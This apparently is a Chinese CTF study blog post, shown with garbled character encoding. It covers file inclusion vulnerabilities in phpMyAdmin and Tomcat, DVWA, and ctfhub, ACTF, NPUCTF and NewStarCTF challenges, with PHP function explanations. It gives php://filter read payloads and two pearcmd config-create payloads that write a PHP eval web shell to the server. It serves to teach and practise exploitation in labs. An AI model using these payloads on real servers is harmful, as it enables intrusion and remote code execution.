<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.1.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="æ–‡ä»¶åŒ…å«æ¼æ´æ–‡ä»¶åŒ…å«æ¼æ´  ä¸¾ä¾‹  https:&#x2F;&#x2F;mail.qq.com&#x2F; åŒ…å«fileincé¶åœº,å¯ä»¥è¿›è¡Œæœ¬æœºæ–‡ä»¶çš„è¯»å–  ï¼ˆXXEå¤–éƒ¨å®ä½“æ³¨å…¥  SSRFæœåŠ¡ç«¯çš„è¯·æ±‚ä¼ªé€    ï¼‰     vm  ubantu 20.04 CVE-2018-12613 PHPMyAdminåå° ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´ CVE-2020-1938 Apache Tomcat æ–‡ä»¶åŒ…å«æ¼æ´        DVWAé¶åœºæ¡ˆ">
<meta property="og:type" content="article">
<meta property="og:title" content="æ–‡ä»¶åŒ…å«æ¼æ´æ²™é¾™æ‰€éœ€çŸ¥è¯†ç‚¹">
<meta property="og:url" content="http://example.com/2024/03/05/%E7%BD%91%E5%AE%89%E5%8D%8F%E4%BC%9A%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%AF%BB%E5%86%99%E6%B2%99%E9%BE%99/index.html">
<meta property="og:site_name" content="â¤ca1huaâ¤">
<meta property="og:description" content="æ–‡ä»¶åŒ…å«æ¼æ´æ–‡ä»¶åŒ…å«æ¼æ´  ä¸¾ä¾‹  https:&#x2F;&#x2F;mail.qq.com&#x2F; åŒ…å«fileincé¶åœº,å¯ä»¥è¿›è¡Œæœ¬æœºæ–‡ä»¶çš„è¯»å–  ï¼ˆXXEå¤–éƒ¨å®ä½“æ³¨å…¥  SSRFæœåŠ¡ç«¯çš„è¯·æ±‚ä¼ªé€    ï¼‰     vm  ubantu 20.04 CVE-2018-12613 PHPMyAdminåå° ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´ CVE-2020-1938 Apache Tomcat æ–‡ä»¶åŒ…å«æ¼æ´        DVWAé¶åœºæ¡ˆ">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-04_23-37-26.png">
<meta property="og:image" content="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-08_01-24-44.png">
<meta property="og:image" content="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-05_01-03-51.png">
<meta property="og:image" content="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-05_01-12-06.png">
<meta property="og:image" content="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-08_01-43-25.png">
<meta property="og:image" content="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_00-07-29.png">
<meta property="og:image" content="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_00-08-35.png">
<meta property="og:image" content="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_00-12-52.png">
<meta property="og:image" content="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_00-35-39.png">
<meta property="og:image" content="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_00-56-41.png">
<meta property="og:image" content="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_01-17-27.png">
<meta property="og:image" content="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_01-21-28.png">
<meta property="og:image" content="c:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240306131310348.png">
<meta property="og:image" content="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_01-38-15.png">
<meta property="og:image" content="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_22-10-14.png">
<meta property="og:image" content="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_22-46-04.png">
<meta property="og:image" content="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-08_02-24-01.png">
<meta property="article:published_time" content="2024-03-05T11:28:15.000Z">
<meta property="article:modified_time" content="2024-03-07T18:24:37.498Z">
<meta property="article:author" content="é™ˆæ›¦">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-04_23-37-26.png">

<link rel="canonical" href="http://example.com/2024/03/05/%E7%BD%91%E5%AE%89%E5%8D%8F%E4%BC%9A%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%AF%BB%E5%86%99%E6%B2%99%E9%BE%99/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>æ–‡ä»¶åŒ…å«æ¼æ´æ²™é¾™æ‰€éœ€çŸ¥è¯†ç‚¹ | â¤ca1huaâ¤</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">â¤ca1huaâ¤</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description"> </p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>æ—¥ç¨‹è¡¨</a>

  </li>
        <li class="menu-item menu-item-sitemap">

    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>ç«™ç‚¹åœ°å›¾</a>

  </li>
        <li class="menu-item menu-item-commonweal">

    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>å…¬ç›Š 404</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/05/%E7%BD%91%E5%AE%89%E5%8D%8F%E4%BC%9A%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%AF%BB%E5%86%99%E6%B2%99%E9%BE%99/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/20240222142431.jpg">
      <meta itemprop="name" content="é™ˆæ›¦">
      <meta itemprop="description" content="çˆ±äººå…ˆçˆ±å·±ï¼Œæ‹©äººå…ˆé—®å¿ƒï¼Œcaihuaç¥ä½ å¤©å¤©å¼€å¿ƒï¼">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="â¤ca1huaâ¤">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          æ–‡ä»¶åŒ…å«æ¼æ´æ²™é¾™æ‰€éœ€çŸ¥è¯†ç‚¹
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2024-03-05 19:28:15" itemprop="dateCreated datePublished" datetime="2024-03-05T19:28:15+08:00">2024-03-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2024-03-08 02:24:37" itemprop="dateModified" datetime="2024-03-08T02:24:37+08:00">2024-03-08</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="æ–‡ä»¶åŒ…å«æ¼æ´"></a>æ–‡ä»¶åŒ…å«æ¼æ´</h2><p>æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p><img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-04_23-37-26.png"></p>
<p>ä¸¾ä¾‹  <a target="_blank" rel="noopener" href="https://mail.qq.com/">https://mail.qq.com/</a></p>
<p>åŒ…å«fileincé¶åœº,å¯ä»¥è¿›è¡Œæœ¬æœºæ–‡ä»¶çš„è¯»å–</p>
<p><img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-08_01-24-44.png"></p>
<p>ï¼ˆXXEå¤–éƒ¨å®ä½“æ³¨å…¥  SSRFæœåŠ¡ç«¯çš„è¯·æ±‚ä¼ªé€    ï¼‰</p>
<p><img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-05_01-03-51.png"></p>
<img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-05_01-12-06.png" style="zoom:25%;" />

<p><img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-08_01-43-25.png"></p>
<p>vm  ubantu 20.04</p>
<p>CVE-2018-12613 PHPMyAdminåå° ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p>CVE-2020-1938 Apache Tomcat æ–‡ä»¶åŒ…å«æ¼æ´</p>
<img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_00-07-29.png" style="zoom:50%;" />

<img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_00-08-35.png" style="zoom:50%;" />



<p><img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_00-12-52.png"></p>
<p>DVWAé¶åœºæ¡ˆä¾‹æ¼”ç¤º</p>
<p><img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_00-35-39.png"></p>
<p><img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_00-56-41.png"></p>
<p>ç™½åå•</p>
<h4 id="CTFé¢˜ç›®å¤ç°å‘¢-ctfhub"><a href="#CTFé¢˜ç›®å¤ç°å‘¢-ctfhub" class="headerlink" title="CTFé¢˜ç›®å¤ç°å‘¢-ctfhub"></a>CTFé¢˜ç›®å¤ç°å‘¢-ctfhub</h4><p>1ã€ã€   ?file&#x3D;shell.txt</p>
<p>2 php:&#x2F;&#x2F;inputã€ã€</p>
<img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_01-17-27.png" style="zoom:67%;" />



<p>3è¿œç¨‹åŒ…å«ã€ã€</p>
<p><img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_01-21-28.png"></p>
<p>4ã€ã€è¯»å–æºä»£ç </p>
<p><code>php://filter/resource=</code> æ˜¯ PHP ä¸­ç”¨äºè®¿é—®å„ç§è¾“å…¥&#x2F;è¾“å‡ºæµï¼ˆIOæµï¼‰çš„ä¸€ç§ç‰¹æ®Šçš„æµå°è£…åè®®ã€‚å®ƒå…è®¸å¼€å‘äººå‘˜å¯¹æ•°æ®æµè¿›è¡Œè¿‡æ»¤å’Œæ“ä½œã€‚å½“ä½ çœ‹åˆ° <code>php://filter/resource=</code> è¿™ç§æ ¼å¼æ—¶ï¼Œå®ƒé€šå¸¸ç”¨äºå¯¹æŒ‡å®šçš„èµ„æºè¿›è¡Œä¸€ç³»åˆ—çš„è¿‡æ»¤æ“ä½œã€‚</p>
<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240306131310348.png" alt="image-20240306131310348" style="zoom:67%;" />

<p>LFIsuite  </p>
<img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_01-38-15.png" style="zoom:50%;" />



<h4 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h4><p><strong>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</strong></p>
<h4 id="Weekinclude-0ã€‚0"><a href="#Weekinclude-0ã€‚0" class="headerlink" title="Weekinclude 0ã€‚0"></a>Weekinclude 0ã€‚0</h4><p>isset()æ˜¯PHPä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæ£€æŸ¥ä¸€ä¸ªå˜é‡æ˜¯å¦å·²ç»è¢«å£°æ˜å¹¶ä¸”ä¸ä¸ºnullã€‚å®ƒæ¥å—ä¸€ä¸ªæˆ–å¤šä¸ªå‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œå³å¦‚æœå˜é‡å·²å£°æ˜ä¸”ä¸ä¸ºnullï¼Œåˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$var</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$var</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å˜é‡å·²å£°æ˜ä¸”ä¸ä¸ºnull&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å˜é‡æœªå£°æ˜æˆ–ä¸ºnull&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>preg_match()æ˜¯PHPä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå¯¹å­—ç¬¦ä¸²è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ã€‚å®ƒæ¥å—ä¸‰ä¸ªå‚æ•°ï¼šæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ã€è¦åŒ¹é…çš„å­—ç¬¦ä¸²å’Œå¯é€‰çš„ä¸€ä¸ªå˜é‡æ¥å­˜å‚¨åŒ¹é…ç»“æœã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;/hello/i&quot;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$string</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;åŒ¹é…æˆåŠŸ&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;åŒ¹é…å¤±è´¥&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨ä¸Šè¿°ç¤ºä¾‹ä¸­ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼<code>/hello/i</code>æ¥åŒ¹é…å­—ç¬¦ä¸²<code>&quot;Hello, World!&quot;</code>ã€‚<code>/hello/i</code>ä¸­çš„<code>/</code>æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„åˆ†éš”ç¬¦ï¼Œ<code>hello</code>æ˜¯è¦åŒ¹é…çš„æ¨¡å¼ï¼Œ<code>i</code>è¡¨ç¤ºå¿½ç•¥å¤§å°å†™ã€‚å› ä¸ºå­—ç¬¦ä¸²ä¸­åŒ…å«â€Helloâ€ï¼Œä¸æ¨¡å¼åŒ¹é…ï¼Œæ‰€ä»¥<code>preg_match()</code>çš„è¿”å›å€¼ä¸ºtrueï¼Œå°†è¾“å‡ºâ€åŒ¹é…æˆåŠŸâ€ã€‚</p>
<p><code>preg_match()</code>è¿˜å¯ä»¥é€šè¿‡ç¬¬ä¸‰ä¸ªå‚æ•°æ¥è·å–åŒ¹é…ç»“æœï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;/(\\d&#123;3&#125;)-(\\d&#123;4&#125;)/&quot;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;Phone: 123-4567&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;åŒ¹é…æˆåŠŸ&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;åŒ¹é…çš„åŒºå·ä¸ºï¼š&quot;</span> . <span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;åŒ¹é…çš„ç”µè¯å·ç ä¸ºï¼š&quot;</span> . <span class="variable">$matches</span>[<span class="number">2</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;åŒ¹é…å¤±è´¥&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨ä¸Šè¿°ç¤ºä¾‹ä¸­ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼<code>/(\\d&#123;3&#125;)-(\\d&#123;4&#125;)/</code>æ¥åŒ¹é…å­—ç¬¦ä¸²<code>&quot;Phone: 123-4567&quot;</code>ã€‚<code>(\\d&#123;3&#125;)</code>å’Œ<code>(\\d&#123;4&#125;)</code>æ˜¯ä¸¤ä¸ªæ•è·ç»„ï¼Œç”¨äºæå–åŒ¹é…çš„åŒºå·å’Œç”µè¯å·ç ã€‚å› ä¸ºå­—ç¬¦ä¸²ä¸­åŒ…å«ç¬¦åˆæ¨¡å¼çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥<code>preg_match()</code>çš„è¿”å›å€¼ä¸ºtrueï¼Œå°†è¾“å‡ºâ€åŒ¹é…æˆåŠŸâ€ï¼Œå¹¶é€šè¿‡<code>$matches</code>æ•°ç»„è·å–åŒ¹é…çš„ç»“æœã€‚</p>
<p>é‡è½½æ˜¯æŒ‡ä¸æ”¹å˜å‡½æ•°åï¼Œä½†æ”¹å˜å‡½æ•°çš„å‚æ•°ã€å‚æ•°ä¸ªæ•°ã€å‚æ•°é¡ºåºã€‚é‡è½½æ”¹å˜äº†å‡½æ•°çš„ç­¾åã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#x27;/base|rot/i&#x27;,$file) //è¿™æ˜¯åŒ¹é…åˆ°baseï¼ŒrotåŠ å¯†å°±è¿”å›1</span><br></pre></td></tr></table></figure>

<p><strong>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.UTF-8.UTF-16&#x2F;resource&#x3D;flag.php</strong></p>
<p><code>filter/read</code> æ˜¯ä¸€ç§PHPæ–‡ä»¶æµè¿‡æ»¤å™¨ï¼ˆFilterï¼‰çš„æ–¹å¼ï¼Œå®ƒå¯ä»¥ç”¨æ¥è¯»å–ç‰¹å®šç±»å‹çš„æ•°æ®æˆ–å¯¹æ•°æ®è¿›è¡Œå¤„ç†ã€‚åœ¨PHPä¸­ï¼Œæµè¿‡æ»¤å™¨æ˜¯ä¸€ç§ç”¨äºåœ¨è¯»å†™æ–‡ä»¶æµæ—¶è¿›è¡Œæ•°æ®è½¬æ¢ã€è¿‡æ»¤æˆ–å¤„ç†çš„æœºåˆ¶ã€‚</p>
<p><code>filter/read</code>é€šè¿‡æŒ‡å®šä¸åŒçš„è¿‡æ»¤å™¨å‚æ•°æ¥è¯»å–æ–‡ä»¶æµçš„å†…å®¹ã€‚å®ƒå¯ä»¥ç”¨äºè¯»å–ä¸åŒçš„æ•°æ®æºï¼Œä¾‹å¦‚æ–‡ä»¶ã€ç½‘ç»œæµç­‰ã€‚é€šè¿‡æŒ‡å®šé€‚å½“çš„è¿‡æ»¤å™¨å‚æ•°ï¼Œå¯ä»¥å®ç°ä»æ•°æ®æºè¯»å–æ•°æ®å¹¶è¿›è¡Œå¤„ç†ï¼Œä¾‹å¦‚è¿›è¡Œç¼–ç è½¬æ¢ã€æ•°æ®è¿‡æ»¤ã€æ•°æ®åŠ å¯†ç­‰æ“ä½œã€‚</p>
<p>åœ¨ç»™å®šçš„payloadä¸­ï¼Œ<code>filter/read=convert.iconv.UTF-8.UTF-16</code>ä½¿ç”¨<code>filter/read</code>è¿‡æ»¤å™¨æ¥è¯»å–æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶ä½¿ç”¨<code>convert.iconv.UTF-8.UTF-16</code>è¿‡æ»¤å™¨å‚æ•°å°†è¯»å–çš„å†…å®¹ä»UTF-8ç¼–ç è½¬æ¢ä¸ºUTF-16ç¼–ç ã€‚è¿™æ ·å¯ä»¥å®ç°åœ¨è¯»å–æ–‡ä»¶å†…å®¹æ—¶è¿›è¡Œç¼–ç è½¬æ¢çš„åŠŸèƒ½ã€‚</p>
<h4 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h4><img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_22-10-14.png" style="zoom:50%;" />

<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_62046696/article/details/127537427">NPUCTF2020]ezinclude-CSDNåšå®¢</a></p>
<img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-06_22-46-04.png" style="zoom:67%;" />

<p><img src="https://ca1hua.oss-cn-beijing.aliyuncs.com/test/Snipaste_2024-03-08_02-24-01.png"></p>
<h4 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Include-ğŸ"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Include-ğŸ" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Include ğŸ"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Include ğŸ</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/122050370">pearcmd.phpçš„å¦™ç”¨_register_argc_argv-CSDNåšå®¢</a></p>
<table>
<thead>
<tr>
<th></th>
<th>fake{Check_register_argc_argv}</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td>webæ¨¡å¼ä¸‹ï¼Œåªæœ‰å¼€å¯äº†register_argc_argvï¼Œæ‰å¯ä»¥è·å–å¤–éƒ¨å‚æ•°</td>
</tr>
</tbody></table>
<p>?+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd&amp;&#x2F;<?=@eval($_POST['cmd']);?>+shell.php</p>
<h4 id="NewStarCTF-å…¬å¼€èµ›èµ›é“-IncludeTwo"><a href="#NewStarCTF-å…¬å¼€èµ›èµ›é“-IncludeTwo" class="headerlink" title="[NewStarCTF å…¬å¼€èµ›èµ›é“]IncludeTwo"></a>[NewStarCTF å…¬å¼€èµ›èµ›é“]IncludeTwo</h4><p>&#x2F;index.php?+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd&amp;&#x2F;<?=eval($_POST[1])?>+&#x2F;tmp&#x2F;hello.php</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/CTF/" rel="tag"># CTF</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/03/04/%E8%B0%88%E8%B0%8851%E5%8D%95%E7%89%87%E6%9C%BA%E4%B8%AD%E7%9A%84PCF8591/" rel="prev" title="è°ˆè°ˆ51å•ç‰‡æœºä¸­çš„PCF8591èŠ¯ç‰‡">
      <i class="fa fa-chevron-left"></i> è°ˆè°ˆ51å•ç‰‡æœºä¸­çš„PCF8591èŠ¯ç‰‡
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
